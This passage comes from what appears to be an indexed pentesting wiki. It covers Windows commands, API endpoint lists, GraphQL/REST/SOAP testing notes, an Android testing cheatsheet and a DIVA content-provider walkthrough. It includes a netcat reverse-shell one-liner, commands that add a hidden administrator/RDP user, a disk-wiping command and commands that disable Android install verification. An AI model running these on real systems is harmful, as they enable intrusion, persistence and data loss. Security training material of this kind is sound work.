</p><pre><code>ipconfig\n</code></pre> </li> <li> <p>Traceroute </p><pre><code>tracert\n</code></pre> </li> <li> <p>List Processes </p><pre><code>tasklist\n</code></pre> </li> <li> <p>Kill a Process </p><pre><code>taskkill /PID 1532 /F\n</code></pre> </li> <li> <p>Shred Disk </p><pre><code>cipher /w:C:\\\n</code></pre> </li> <li> <p>Mounting and Mapping </p><pre><code>wmic logicaldisk get deviceid, volumename, description\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/windows/#scripts-for-fun","title":"Scripts for Fun:","text":"<ul> <li> <p>Make Request </p><pre><code>import requests\n\nreq = requests.get(\"http://site.com\")\nprint req.status_code\nprint req.text\n</code></pre> </li> <li> <p>Read and Write to Files </p><pre><code>file_open = open(\"readme.txt\", \"r\")\nfor line in file_open:\n    print line.strip(\"\\n\")\n    if line.strip(\"\\n\") == \"rad 4\":\n        print \"last line\"\n</code></pre> </li> <li> <p>Echo to Python File for Reverse Shell </p><pre><code>echo 'import os; os.system(\"/bin/nc ip port -e /bin/bash\")' &gt; /opt/tmp.py\n</code></pre> </li> </ul>"},{"location":"Other/basic-linux-commands/windows/#windows-rdp-operations","title":"Windows RDP Operations:","text":"<ul> <li>Add RDP User <pre><code>net user hodor Qwerty123! /add\nnet localgroup administrators hodor /add\nnet localgroup \"Remote Desktop Users\" hodor /add\n</code></pre></li> </ul>"},{"location":"Pentesting/","title":"Pentesting","text":""},{"location":"Pentesting/#pentesting","title":"Pentesting","text":"<ul> <li> <p> Web Application</p> <p>Assess and fortify the security of web applications</p> </li> <li> <p> API</p> <p>Ensure the resilience of APIs against cyber threats</p> </li> <li> <p> Android</p> <p>Safeguard Android applications from vulnerabilities</p> </li> <li> <p> IOS</p> <p>Strengthen iOS applications against potential exploits</p> </li> <li> <p> Network</p> <p>Identify and mitigate network vulnerabilities</p> </li> <li> <p> Thick Client</p> <p>Enhance the security posture of thick client applications</p> </li> <li> <p> Cloud</p> <p>Validate the security of cloud environments</p> </li> <li> <p> Secure Code Review</p> <p>Identify and remediate security flaws in code through</p> </li> <li> <p> Physical</p> <p>Assess physical security measures and protocols</p> </li> </ul>"},{"location":"Pentesting/Resources/","title":"Pentesting Resources","text":""},{"location":"Pentesting/Resources/#pentesting-resources","title":"Pentesting Resources","text":""},{"location":"Pentesting/Resources/#web-app-pentest-bug-bounty","title":"Web App Pentest / Bug Bounty","text":"<ul> <li>Keyhacks</li> <li>Book of Bug Bounty Tips</li> <li>BugReader</li> <li>Web App Pentest Mind Map</li> <li>Web Application Security Mind Map</li> <li>HowToHunt</li> <li>PayloadsAllTheThings</li> <li>Medium Article on Web App Pentest</li> </ul>"},{"location":"Pentesting/Resources/#android-app-pentest","title":"Android App Pentest","text":"<ul> <li>Mobile App Pentest Checklist</li> </ul>"},{"location":"Pentesting/Resources/#api-pentest","title":"API Pentest","text":"<ul> <li>API Security Checklist Spreadsheet</li> <li>API Security Checklist GitHub</li> <li>VAmPI</li> </ul>"},{"location":"Pentesting/Resources/#ios-app-pentest","title":"iOS App Pentest","text":"<ul> <li>iOS App Pentest Resources</li> </ul>"},{"location":"Pentesting/Resources/#source-code-review","title":"Source Code Review","text":"<ul> <li>FindSecBugs</li> <li>JSHint</li> <li>OWASP Code Review Guide</li> <li>Semgrep</li> </ul>"},{"location":"Pentesting/Resources/#thick-client-pentesting","title":"Thick Client Pentesting","text":"<ul> <li>Thick Client Basics</li> <li>Thick Client Penetration Testing Methodology</li> <li>Introduction to File Operation Abuse on Windows</li> <li>Thick Client Exploitation to Becoming Kubernetes Cluster Admin</li> <li>More Thick Client Fun</li> <li>Thick Client Proxying</li> <li>Burp Non-HTTP Extension</li> <li>Thick Client (In)Security</li> <li>Introduction to Hacking Thick Clients Part 1: The GUI</li> <li>Build a TCP Proxy in Python</li> </ul>"},{"location":"Pentesting/Resources/#cloud-security","title":"Cloud Security","text":"<ul> <li>CloudBerry Engineering Tool</li> <li>Awesome Cloud Security</li> </ul>"},{"location":"Pentesting/API/api-endpoints/","title":"Common API Endpoints","text":""},{"location":"Pentesting/API/api-endpoints/#common-api-endpoints","title":"Common API Endpoints","text":"<pre><code>/swagger-ui/swagger.json\n/apidocs/swagger.json\n/api-docs/swagger.json\n/swagger-ui\n/api-docs\n/apidocs\n/swagger\n/v1/swagger.json\n/swagger-ui.html\n/api/swagger-ui.html \n/swagger-resources/restservices/v2/api-docs\n/api/v2/swagger.json\n/__swagger__/\n/_swagger_/\napi/swagger\napi/swagger/\napi/swagger.json\napi/swagger-ui\napi/swagger-ui.html\napi/swagger-ui.json\napi/v1/swagger\napi/v1/swagger/\napi/v1/swagger-ui\napi/v1/swagger-ui.html\napi/v1/swagger-ui.json\napi/v2/swagger\napi/v2/swagger/\napi/v2/swagger.json\napi/v2/swagger-ui\napi/v2/swagger-ui.html\napi/v2/swagger-ui.json\n/swagger/ui/index\n/swagger/index.html\n/swagger-resources\n/swagger/static/index.html\n/swagger/ui/index\n/swagger\n/api/apidocs\n/api/v1/apidocs\n/api/v2/apidocs\n/api/api-docs\n/api/v1/api-docs\n/api/v2/api-docs\n/swagger/\n/swagger.json\n/swagger-ui.json\n/swagger.yml\n/api/v1/swagger\n/api/v1/swagger/\n/api/v1/swagger-ui\n/api/v1/swagger-ui.html\n/api/v1/swagger-ui.json\n/graphql\n/api\n/api/v1/\n/api/v2\n/api/v3\n/v2/apis/auth/_resource\n/v1/swagger-ui.html\n/docs/swaggeer.json\n/api/swagger.yml\n/swagger-resources\n/swagger/swagger-ui.html\n/swagger.json\n/REST/v1/swagger\n/swagger/v1/swagger.json \n/swagger/v2/swagger.json\n/swagger.json   \n/v2/swagger.json    \n/api/v1/swagger.json\n/spec/swagger.json\n</code></pre>"},{"location":"Pentesting/API/graphql/","title":"GraphQL API Pentesting","text":""},{"location":"Pentesting/API/graphql/#graphql-api-pentesting","title":"GraphQL API Pentesting","text":"<p>GraphQL introduces a flexible and powerful way to interact with APIs, but it also brings new security considerations. Here's an overview of GraphQL security, common misconfigurations, and useful tools:</p>"},{"location":"Pentesting/API/graphql/#concept","title":"Concept","text":"<ul> <li>Query Language for APIs: GraphQL provides a query language for APIs, allowing clients to request exactly the data they need.</li> <li>Runtime for Data Fulfillment: It serves as a runtime for fulfilling those queries with existing data, providing a complete description of the API data.</li> </ul>"},{"location":"Pentesting/API/graphql/#common-misconfigurations","title":"Common Misconfigurations","text":""},{"location":"Pentesting/API/graphql/#introspection-query","title":"Introspection Query","text":"<ul> <li>Risk: Exposing introspection queries to the public can lead to information disclosure, revealing sensitive API details.</li> <li>Recommendation: Limit access to introspection queries internally and prevent public access to sensitive API information.</li> </ul>"},{"location":"Pentesting/API/graphql/#tools-burp-extensions","title":"Tools &amp; Burp Extensions","text":"<ul> <li>inql: A security testing tool for GraphQL APIs that allows for fuzzing, query discovery, and other security testing functionalities.</li> <li>Burp Extensions: Extensions like \"GraphQL Raider\" for Burp Suite provide capabilities for scanning and testing GraphQL endpoints for security vulnerabilities.</li> </ul>"},{"location":"Pentesting/API/graphql/#references","title":"References","text":"<ul> <li>GraphQL Voyager: A tool for visualizing GraphQL APIs, providing insights into schema structure and relationships.</li> <li>Detectify Labs Article: Discusses GraphQL abuse and potential security risks associated with misconfigured GraphQL endpoints.</li> <li>Medium Articles: Various articles explore GraphQL vulnerabilities and exploitation techniques, offering insights and practical examples.</li> </ul>"},{"location":"Pentesting/API/graphql/#additional-resources","title":"Additional Resources","text":"<ul> <li>Awesome GraphQL Repository: Curated list of resources, tools, and tutorials for learning and working with GraphQL.</li> <li>GraphQL.org: Official GraphQL website provides comprehensive documentation and learning resources for developers.</li> <li>Visualize the query results using https://apis.guru/graphql-voyager/</li> <li>https://labs.detectify.com/2018/03/14/graphql-abuse/</li> <li>https://github.com/doyensec/inql</li> <li>https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6</li> <li>https://github.com/chentsulin/awesome-graphql</li> <li>https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e</li> <li>https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</li> <li>https://graphql.org/learn/</li> <li>https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</li> <li>https://www.youtube.com/watch?v=jyjGneKJynk</li> </ul>"},{"location":"Pentesting/API/rest/","title":"REST API Pentesting","text":""},{"location":"Pentesting/API/rest/#rest-api-pentesting","title":"REST API Pentesting","text":"<p>REST (Representational State Transfer) APIs are widely used for communication between client and server applications. Pentesting REST APIs involves identifying vulnerabilities and assessing security risks associated with these interfaces. Here's an overview of REST API pentesting, common vulnerabilities, and useful resources:</p>"},{"location":"Pentesting/API/rest/#concept","title":"Concept","text":"<ul> <li>Communication Protocol: REST APIs use HTTP methods (GET, POST, PUT, DELETE) to perform operations on resources represented by URLs.</li> <li>Stateless Communication: Each request from the client to the server is stateless, meaning the server does not store any client session information.</li> </ul>"},{"location":"Pentesting/API/rest/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"Pentesting/API/rest/#injection-attacks","title":"Injection Attacks","text":"<ul> <li>Injection vulnerabilities (e.g., SQL injection, XPath injection) can occur if input parameters are not properly validated or sanitized. SQL injection in a parameterized SQL query used by the API to interact with the database.</li> </ul>"},{"location":"Pentesting/API/rest/#authentication-and-authorization-issues","title":"Authentication and Authorization Issues","text":"<ul> <li>Weak or missing authentication mechanisms can lead to unauthorized access to sensitive resources. Lack of proper authorization checks allowing unauthenticated users to access restricted endpoints.</li> </ul>"},{"location":"Pentesting/API/rest/#sensitive-data-exposure","title":"Sensitive Data Exposure","text":"<ul> <li>Exposing sensitive data (e.g., credentials, personally identifiable information) in API responses or logs. Including passwords or API keys in plaintext within API responses.</li> </ul>"},{"location":"Pentesting/API/rest/#insecure-direct-object-references-idor","title":"Insecure Direct Object References (IDOR)","text":"<ul> <li>Improperly implemented references to internal objects or resources can allow attackers to access unauthorized data. Predictable resource IDs that allow an attacker to access data belonging to other users.</li> </ul>"},{"location":"Pentesting/API/rest/#denial-of-service-dos","title":"Denial of Service (DoS)","text":"<ul> <li>Attackers can exploit API endpoints to exhaust server resources or cause service disruptions. Sending a large volume of requests to a resource-intensive endpoint to overload the server.</li> </ul>"},{"location":"Pentesting/API/rest/#tools-frameworks","title":"Tools &amp; Frameworks","text":"<ul> <li>Burp Suite: Widely used for intercepting and manipulating HTTP requests and responses, helpful for analyzing REST API traffic.</li> <li>OWASP ZAP: Open-source web application security scanner with features for testing REST APIs.</li> <li>Postman: API development environment with capabilities for testing and debugging REST APIs.</li> </ul>"},{"location":"Pentesting/API/rest/#references","title":"References","text":"<ul> <li>OWASP API Security Top 10: OWASP's list of the most critical security risks to APIs, providing guidance on mitigating common vulnerabilities.</li> <li>REST API Security Checklist: Checklist covering various security considerations for designing, testing, and securing REST APIs.</li> <li>REST Security Cheat Sheet: Comprehensive guide from OWASP on securing REST APIs, covering authentication, authorization, encryption, and more.</li> </ul>"},{"location":"Pentesting/API/soap/","title":"SOAP API Pentesting","text":""},{"location":"Pentesting/API/soap/#soap-api-pentesting","title":"SOAP API Pentesting","text":"<p>SOAP (Simple Object Access Protocol) APIs are widely used for communication between client and server applications. Pentesting SOAP APIs involves identifying vulnerabilities and assessing security risks associated with these interfaces. Here's an overview of SOAP API pentesting, common vulnerabilities, and useful resources:</p>"},{"location":"Pentesting/API/soap/#concept","title":"Concept","text":"<ul> <li>Communication Protocol: SOAP APIs use XML-based messages to perform operations between client and server applications.</li> <li>Formal Specification: SOAP APIs have a formal specification defining message structure, data types, and communication protocols.</li> </ul>"},{"location":"Pentesting/API/soap/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"Pentesting/API/soap/#xml-external-entity-xxe-injection","title":"XML External Entity (XXE) Injection","text":"<ul> <li>XXE vulnerabilities occur when XML input is not properly validated, allowing attackers to include external entities that may disclose sensitive information or execute arbitrary code. Including an external entity in a SOAP request to read sensitive files on the server.</li> </ul>"},{"location":"Pentesting/API/soap/#xml-injection","title":"XML Injection","text":"<ul> <li>XML injection vulnerabilities arise when user-supplied XML input is not properly sanitized, leading to unexpected behavior or disclosure of sensitive information. Manipulating XML input parameters to modify SOAP request structure or execute unintended operations.</li> </ul>"},{"location":"Pentesting/API/soap/#soapaction-header-injection","title":"SOAPAction Header Injection","text":"<ul> <li>Manipulating the SOAPAction header can lead to unauthorized access, bypassing authentication, or triggering unintended operations on the server. Modifying the SOAPAction header value to execute administrative actions without proper authorization.</li> </ul>"},{"location":"Pentesting/API/soap/#insecure-deserialization","title":"Insecure Deserialization","text":"<ul> <li>Insecure deserialization vulnerabilities can lead to remote code execution or unauthorized data access if attackers can manipulate serialized objects. Crafting malicious SOAP requests to exploit deserialization vulnerabilities in the server-side application.</li> </ul>"},{"location":"Pentesting/API/soap/#tools-frameworks","title":"Tools &amp; Frameworks","text":"<ul> <li>Burp Suite: Widely used for intercepting and manipulating SOAP requests and responses, helpful for analyzing traffic and identifying vulnerabilities.</li> <li>SoapUI: API testing tool specifically designed for testing SOAP and REST APIs, providing features for functional testing, security testing, and performance testing.</li> <li>WS-Attacker: Burp Suite extension for testing Web Services security, including SOAP APIs, for vulnerabilities such as XML injection and XXE.</li> </ul>"},{"location":"Pentesting/API/soap/#references","title":"References","text":"<ul> <li>OWASP Web Services Security Project: Provides guidance and best practices for securing web services, including SOAP APIs, against common vulnerabilities.</li> <li>W3C SOAP Specification: Official specification defining the SOAP protocol, message structure, and related standards.</li> <li>Books: \"Hacking Web Services\" by Shreeraj Shah covers in-depth techniques for testing and securing web services, including SOAP APIs.</li> </ul>"},{"location":"Pentesting/Android/broken-cryptography/","title":"Broken Cryptography","text":""},{"location":"Pentesting/Android/broken-cryptography/#broken-cryptography","title":"Broken Cryptography","text":"<p>When an app developer wants to take advantage of encryption in his application. But due to using unaware or improper cryptography attacker can take advantage and reverse encryption into plain text. This flaw known as Broken Cryptography; it can be done by:</p> <ul> <li>Poor Key Management Process</li> </ul> <p>If developer store key in the same readable directory as the encrypted content, attacker can take the key and decrypt the algorithm. Avoid uses hardcoded key or password within binary or source code. Keys may be intercepted via binary attacks</p> <ul> <li>Creating custom encryption protocols:</li> </ul> <p>There is no easier way to mishandle encryption\u2013mobile or otherwise\u2013than to try to create and use your own encryption algorithms or protocols.</p> <ul> <li>Use of Insecure and/or Deprecated Algorithms</li> </ul> <p>Many cryptographic algorithms and protocols should not be used because they have been shown to have significant weaknesses or are otherwise insufficient for modern security requirements. These include:</p> <ul> <li>RC2</li> <li>MD4</li> <li>MD5</li> <li>SHA1</li> </ul>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/","title":"Command line Cheatsheet for Android PT","text":""},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#command-line-cheatsheet-for-android-pt","title":"Command line Cheatsheet for Android PT","text":""},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#adb-cheatsheet","title":"ADB Cheatsheet","text":"<p>Download adb http://adbdriver.com/downloads/ or you can using adb as default from Android Studio.</p>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#adb-command","title":"ADB Command","text":"<pre><code># Check Android Architecture\n$ adb shell getprop | grep abi\n# Try to use this command to get simple output :)\n$ adb shell getprop ro.product.cpu.abi\n\n# List all application already installed\n$ adb shell pm list packages -f | grep -i 'testing'\n\n# Tracing log on android\n$ adb logcat | grep com.app.testing\n\n# Install application to device\n$ adb install app.testing.apk\n\n# Get the full path of an application\n$ adb shell pm path com.example.someapp\n\n# Download the apk to development machine\n$ adb pull /data/app/com.example.someapp-2.apk\n\n# Dump activity on app\n$ adb shell dumpsys activity top | grep ACTIVITY\n\n# Create new file in adb shell\n$ cat &gt; filename.xml\nYou can add lines to a text files using:\n$ cat &gt;&gt; filename.xml\nBoth commands can be terminated using ctrl-D.\n\n# Dump Memory\n$ adb shell dumpsys meminfo com.package.name\n\n# Disable verification adb\n$ adb shell settings put global verifier_verify_adb_installs 0\n\n# Disable verification package\n$ adb shell settings put global package_verifier_enable 0\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#frida-cheatsheet","title":"Frida Cheatsheet","text":"<p>Install Frida Server on android, download frida server : https://github.com/frida/frida/releases</p> <pre><code>$ adb root # might be required\n$ adb push frida-server /data/local/tmp/\n$ adb shell \"chmod 755 /data/local/tmp/frida-server\"\n$ adb shell \"/data/local/tmp/frida-server &amp;\"\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#frida-command","title":"Frida Command","text":"<pre><code># Connect Frida to an iPad over USB and list running processes\n$ frida-ps -U\n\n# List running applications\n$ frida-ps -Ua\n\n# List installed applications\n$ frida-ps -Uai\n\n# Connect Frida to the specific device\n$ frida-ps -D 0216027d1d6d3a03\n\n# Trace recv* and send* APIs in Safari\n$ frida-trace -i \"recv*\" -i \"send*\" Safari\n\n# Trace ObjC method calls in Safari\n$ frida-trace -m \"-[NSView drawRect:]\" Safari\n\n# Launch SnapChat on your iPhone and trace crypto API calls\n$ frida-trace -U -f com.app.testing -I \"libcommonCrypto*\"\n\n#Frida trace every open function while program start\n$ frida-trace -U -i open com.app.testing\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#frida-tracing","title":"Frida Tracing","text":"<p>Download : https://github.com/Piasy/FridaAndroidTracer Usage :</p> <pre><code>$ java -jar FridaAndroidTracer.jar\n-a,--expand-array      expand array values\n-c,--classes &lt;arg&gt;     classes to be hooked\n-j,--jars &lt;arg&gt;        jar files to be included\n-o,--output &lt;arg&gt;      output script path\n-p,--include-private   include private methods\n-s,--skip &lt;arg&gt;        methods to be skipped\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#frida-trick","title":"Frida Trick","text":"<p>Bypass Root Detection: Bypass anti-root detection in android application try to using different data type to break the logic flaws.</p> <p>https://github.com/m0bilesecurity/Frida-Mobile-Scripts</p>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#objection","title":"Objection","text":"<p>Install from https://github.com/sensepost/objection </p><pre><code>pip3 install objection\n</code></pre> <p>Usage: Default Running Objection </p><pre><code>objection --gadget \"com.application.id\" explore\n</code></pre> <p>Running Objection with command </p><pre><code>objection --gadget \"com.application.id\" explore --startup-command \"ios jailbreak disable\"\n</code></pre> <p>Running Objection with script </p><pre><code>objection --gadget \"com.application.id\" explore --startup-script antiroot.js\n</code></pre> <p>Inject Frida Gadget into APK with Objection </p><pre><code>objection patchapk --source apkname.apk\n</code></pre> After run application, the application will be paused and show the white screen at this moment you should run <code>objection explore</code> to resume the application."},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#andbug-for-enumerate-class-and-method-on-application","title":"AndBug - For Enumerate Class And Method On Application","text":"<p>Download https://github.com/swdunlop/AndBug Usage:</p> <pre><code>#Enumerate classes on application\n$ andbug classes -p [PID application / com.app.testing] &gt; class.txt\n\n#Enumerate methods on classes\n$ andbug methods -p [PID application / com.app.testing] [class name]\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#android-log-tracing","title":"Android Log Tracing","text":"<p>Using PIDCAT : https://github.com/JakeWharton/pidcat Usage:</p> <pre><code>$ ./pidcat.py [com.app.testing]\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#decompile-apk-file","title":"Decompile APK File","text":""},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#apkx-for-decompile-apk","title":"APKX for decompile apk","text":"<p>Download https://github.com/b-mueller/apkx Usage :</p> <pre><code>$ apkx -c enjarify -d procyon app.testing.apk\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#bytecode-viewer-gui","title":"Bytecode Viewer - GUI","text":"<p>Download https://github.com/Konloch/bytecode-viewer/releases To read source code of dex or jar file. how to run : Just double click on jar file</p>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#reverse-apk","title":"Reverse-Apk","text":"<p>Download https://github.com/1N3/ReverseAPK Install :</p> <pre><code>$ git clone https://github.com/1N3/ReverseAPK.git\n$ cd ReverseAPK \n$ ./install\n</code></pre> <p>Usage :</p> <pre><code>$ reverse-apk app.testing.apk\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#install-burp-certificate-on-android","title":"Install Burp Certificate On Android","text":"<p>Convert burp certificate from DER to PEM . If you lazy, you can download PEM file on this repository.</p> <pre><code>$ openssl x509 -inform DER -in cacert.der -out cacert.pem\n# Get subject_hash_old (or subject_hash if OpenSSL &lt; 1.0)\n$ openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1\n$ mv cacert.pem 9a5ba575.0\n</code></pre> <p>Install PEM file to the System Trusted Credentials on device.</p> <pre><code>$ adb root\n$ adb remount  \n$ adb push 9a5ba575.0 /system/etc/security/cacerts/  \n$ adb shell \"chmod 644 /system/etc/security/cacerts/9a5ba575.0\"\n$ adb shell \"reboot\" \n</code></pre> <p>If your system cant mounting, You must mounting first.</p> <pre><code>$ adb root\n$ adb shell\n# Check mounting list\n$ cat /proc/mounts\n#/dev/block/bootdevice/by-name/system /system ext4 ro,seclabel,relatime,discard,data=ordered 0 0\n$ mount -o rw,remount -t rfs /dev/block/bootdevice/by-name/system /system\n$ adb push 9a5ba575.0 /system/etc/security/cacerts/  \n$ adb shell \"chmod 644 /system/etc/security/cacerts/9a5ba575.0\"\n$ adb shell \"reboot\" \n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#install-open-gapps-on-android-emulator","title":"Install Open Gapps On Android Emulator","text":"<p>Download : https://opengapps.org Extract :</p> <pre><code># download the latest open_gapps zip file\n$ unzip open_gapps-x86_64.*****.zip 'Core/*'\n$ rm Core/setup*\n$ lzip -d Core/*.lz\n$ for f in $(ls Core/*.tar); do\n  tar -x --strip-components 2 -f $f\ndone\n</code></pre> <p>Install to Emulator :</p> <pre><code>$ adb root\n$ adb remount\n$ adb push etc /system\n$ adb push framework /system\n$ adb push app /system\n$ adb push priv-app /system\n$ adb shell stop\n$ adb shell start\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#emulator","title":"Emulator","text":""},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#android-studio-emulator","title":"Android Studio Emulator","text":"<p>This command for run emulator from android studio, make you have already install android studio before. if you want to root android emulator, please using system without (Google API's) or (Google Play)  </p> <pre><code># List all emulator\n$ emulator.exe -list-avds \n# Run Emulator\n$ emulator.exe -avd [EmulatorName]\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#genymotion","title":"Genymotion","text":"<p>Download https://www.genymotion.com/</p>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#qark-quick-android-review-kit","title":"QARK - Quick Android Review Kit","text":"<p>Download https://github.com/linkedin/qark For quick analyze application on android with scanning the apk or java file and create Proof Of Concept of vulnerability. Install QARK:</p> <pre><code>$ git clone https://github.com/linkedin/qark\n$ cd qark\n$ pip install -r requirements.txt\n$ pip install . --user  # --user is only needed if not using a virtualenv\n$ qark --help\n</code></pre> <p>Usage to scan APK:</p> <pre><code>$ qark --apk path/to/my.apk\n</code></pre> <p>Usage to scan Java source code files:</p> <pre><code>$ qark --java path/to/parent/java/folder\n$ qark --java path/to/specific/java/file.java\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#screen-mirroring-android-device-to-laptop-or-computer","title":"SCREEN MIRRORING ANDROID DEVICE TO LAPTOP OR COMPUTER","text":"<p>I believe you want to mirroring android screen to your laptop or computer, you can buy a software to do that or you can use this tool SCRCPY for free :D</p>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#install-scrcpy","title":"Install SCRCPY","text":"<p>Mac : </p><pre><code>brew install scrcpy\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#usefull-command","title":"Usefull command","text":"<p>Run with window borderless :  </p><pre><code>scrcpy -t --window-title 'My Research' --always-on-top\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#repackage-modify-apk","title":"Repackage Modify APK","text":"<p>Step to repackaging apk.</p> <p>1.\u00a0Download original apk. 2.\u00a0Extrack apk with apktool. </p><pre><code>apktool d vantagepoint.apk -o vantagepoint\n</code></pre> 3.\u00a0Modify the apk. 4.\u00a0Repackage apk with apktool.     <pre><code>apktool b vantagepoint -o vantagepoint_bank_1.apk\n</code></pre> 5.\u00a0Align and Signing the APK with uber-apk-signer. <pre><code>To create the certificate I used this tool [APK Signer Tool v2](https://shatter-box.com/download/apk-signer-tool-v2/), the tool has a GUI and these tools is capable to do align and singing the apk also.\nDownload : [Uber-Apk-Signer](https://github.com/patrickfav/uber-apk-signer)\n\njava -jar uber-apk-signer-1.1.0.jar -a vantagepoint_bank.apk --ks vantagepoint.jks --ksAlias vantagepoint-pass --ksKeyPass 1234567 --ksPass 1234567 -o vantagepoint_bank_release\n</code></pre> <p>6.\u00a0Cek signed APK to verify the apk was sign with our certificate(optional)  </p> <pre><code>keytool -list -printcert -jarfile \"vantagepoint_bank-aligned-signed.apk\"\n</code></pre>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#for-lazy-people-v","title":"For Lazy People :v","text":"<ol> <li>Automate Check Root Detection -&gt; https://github.com/laconicwolf/Android-App-Testing/blob/master/check_for_root_detection.py</li> <li>Automate Install Burp CA on Android -&gt; https://github.com/laconicwolf/Android-App-Testing/blob/master/install_burp_cert.py</li> <li>Automate Repackage Apk -&gt; https://github.com/laconicwolf/Android-App-Testing/blob/master/repackage_apk_for_burp.py</li> </ol>"},{"location":"Pentesting/Android/command-line-for-android-pt-cheatsheet/#references","title":"References","text":"<ul> <li> <p>https://github.com/mirfansulaiman/Command-Mobile-Penetration-Testing-Cheatsheet</p> </li> <li> <p>https://www.linkedin.com/pulse/hacking-android-apps-through-exposed-components-tal-melamed/</p> </li> </ul>"},{"location":"Pentesting/Android/content-providers/","title":"Content Providers","text":""},{"location":"Pentesting/Android/content-providers/#content-providers","title":"Content Providers","text":"<p>A content provider is a component fetches data that the app requests from a repository in secure manner.</p> <p>Let's understand with one example how actually it works.</p> <p></p> <p>In this example we took two apps whatsapp and contact app so as we know whatsapp need contact access. so firstly with the help of content resolver whatsapp create request for accessing contact, then contact application check that content provider is implemented or not if yes it will look for the data which whatsapp requested, after checking permissions cursor get back to whatsapp with requested data. </p> <p>This is general example that how things actually works. </p> <ul> <li> <p>Content Resolver - It is class gives access to content provider ( Requesting Data )</p> </li> <li> <p>getContentResolver() returns instance of current content resolver.</p> </li> <li> <p>Uniform Resource Identifier (URL) - To hit current content provider.</p> </li> <li> <p>CRUD Operations - Create, Retrieve, Update &amp; Delete</p> </li> <li> <p>Batch Operations - It provides mechanism to connect with remote data.</p> </li> </ul>"},{"location":"Pentesting/Android/content-providers/#cursor-respond-back-with-data-by-using-ipc","title":"Cursor - Respond back with data by using IPC","text":"<p>User Dictionary Provider requires the android.permission.READ_USER_DICTIONARY permission to retrieve data from it. The provider has the separate android.permission.WRITE_USER_DICTIONARY permission for inserting, updating, or deleting data.</p>"},{"location":"Pentesting/Android/content-providers/#structure-of-content-uri","title":"Structure of Content URI","text":"<p>We can identify content provider in android manifest under <code>&lt;provider&gt;</code> tag</p> <p>While constructing query we need to consider two part --Selection &amp; --Projection.</p> <p>Selection is basically a part in where we need to specify the which column or row which we want and from which table where as in selection part we have to specify the condition.</p> <p></p> <p>How to approach content provider ?</p> <p></p> <p>In the above flow, we have to first look for provider which are exported and without mandatory permissions. now sometimes the provider is exported but there are permissions but developer forget to protect paths such as sometimes content://provider/ this is protected but content://provider/vulnpath is not protected so we can take benefits of that, now when we have any two of above condition we can directly look for data retrieving the data via that provider. other than this we look into provider class and if we found some misconfiguration such as Broken Query could be the entry point for sql injection or if FileProvider is enabled then either we look for Local File Access or Path Transversal.</p> <p>Let's have look how practically we can exploit content providers:</p> <p>Prerequisite:</p> <ul> <li> <p>We need drozer you will get drozer from here: https://github.com/FSecureLABS/drozer</p> </li> <li> <p>If not working properly get use docker: https://hub.docker.com/r/fsecurelabs/drozer</p> </li> <li> <p>We also need DIVA for testing: https://github.com/payatu/diva-android</p> </li> </ul>"},{"location":"Pentesting/Android/content-providers/#open-diva-application-and-check-access-control-issue","title":"Open Diva Application and check Access Control Issue","text":"<p>There is a feature that allows you to establish a pin for private notes, and those notes can only be accessed after entering the pin. There is no other method to access such notes without first verifying the pin. Now where data operations comes, the content provider is involved.</p> <p></p> <p>Let's go with flow and see if we found something. Check AndroidManifest.xml</p> <pre><code>&lt;provider android:name=\"jakhar.aseem.diva.NotesProvider\" \u00a0\n\nandroid:enabled=\"true\" android:exported=\"true\" \u00a0\n\nandroid:authorities=\"jakhar.aseem.diva.provider.notesprovider\"/&gt;\n</code></pre> <p>So as we can see there is provider which is exported now permissions we can check with the help of drozer.</p> <p>if you need help with how to setup drozer check </p> <p>https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/</p> <p>once drozer is successfully setup access drozer console and check for the package name by following command.</p> <p></p> <p>With drozer we can do a lots of things without going manually. but for now we only look for content provider. By using following command we can get all the provider uri's from apps.</p> <p></p> <p>so get back to flow and check permissions</p> <p></p> <p>as there no permissions we can check provider class.</p> <p>After looking into class we got \u00a0information that the notes can be accessible via content://jakhar.aseem.diva.provider.notesprovider/notes URI so now we can query and try that does it allow us to access the notes without verifying pin or not.</p> <p>by using app.provider.query module we can make request.</p> <p></p> <p>As we can see in above image that we can access the notes without having any pin verification. </p> <p>other than this we can perform different CRUD operations.</p> <p>Some modules for further 